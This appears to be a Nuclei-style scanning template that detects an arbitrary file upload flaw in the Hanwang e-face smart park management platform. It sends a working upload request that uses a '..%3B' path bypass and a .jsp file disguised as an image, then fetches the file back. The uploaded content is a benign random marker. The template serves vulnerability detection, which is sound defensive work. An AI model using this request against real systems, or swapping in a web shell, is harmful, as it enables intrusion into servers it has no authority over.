id: poc-yaml-hw-e-face-pass-spmp-uploadblacklistfile-do-anyfile-upload
info:
  name: 汉王e脸通智慧园区管理平台 uploadBlackListFile.do 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  description: |
    This template detects an arbitrary file upload vulnerability in 汉王e脸通智慧园区管理平台 through the uploadBlackListFile.do endpoint.

variables:
  t1: "{{rand_base(5)}}"
  t2: "{{base64(t1)}}"

flow: |
  http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "/manage/mobiVisit/..%3B/systemBlackList/uploadBlackListFile.do"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
    body: |-
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
      Content-Type: image/jpeg

      {{t2}}
      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"success\":true"
    extractors:
      - type: regex
        name: uploaded-file
        part: body
        internal: true
        regex:
          - "resource/(?P<file>.*?).jsp"

  - id: verify-file
    method: GET
    path:
      - "/manage/resource/{{uploaded-file}}.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{t2}}"
